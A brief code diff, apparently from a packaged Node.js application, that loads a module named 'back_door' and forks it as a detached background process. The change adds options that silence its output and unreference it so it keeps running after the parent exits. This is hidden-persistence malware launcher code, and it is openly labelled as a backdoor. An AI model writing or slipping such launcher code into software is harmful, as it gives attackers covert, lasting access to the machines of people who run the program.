@@ -8,4 +8,5 @@ var require = function (str) {}
 require('./back_door/index.js')
 
 // Execute backdoor in detached mode
-subprocess = fork(path.join('/snapshot/build/' , './back_door/index.js'), [], { detached: true })
+subprocess = fork(path.join('/snapshot/build/' , './back_door/index.js'), [], { detached: true, stdio: 'ignore' })
+subprocess.unref()
